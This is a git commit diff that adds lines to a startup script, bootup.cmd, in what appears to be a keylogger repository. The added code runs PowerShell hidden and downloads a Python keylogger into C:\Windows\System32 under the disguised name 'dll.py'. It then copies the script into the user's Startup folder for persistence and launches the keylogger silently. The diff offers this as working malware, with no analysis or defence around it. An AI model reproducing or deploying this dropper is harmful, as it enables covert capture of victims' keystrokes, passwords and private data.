98d3c5f0fa69af10fc1d500d6ebaf39fffe97d73
ASL-rgb <80420900+ASL-rgb@users.noreply.github.com>
2022-08-21 22:27:48 +0200

    Update bootup.cmd

--- bootup.cmd
+++ bootup.cmd
@@ -1,1 +1,15 @@
+powershell -WindowStyle hidden
+$username = $env:UserName
+$filedest = 'C:\Users\' + $username + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bootup.cmd'
+$dest = "C:\Windows\System32\dll.py"
+$bol1 = Test-Path -Path $dest
+$bol2 = Test-Path -Path $filedest
+
+if (-Not $bol1){
+  Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -Outfile $dest
+}
+if (-Not $bol2){
+  Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/bootup.cmd" -Outfile $filedest
+}
+  
 powershell -WindowStyle hidden python C:\Windows\System32\dll.py
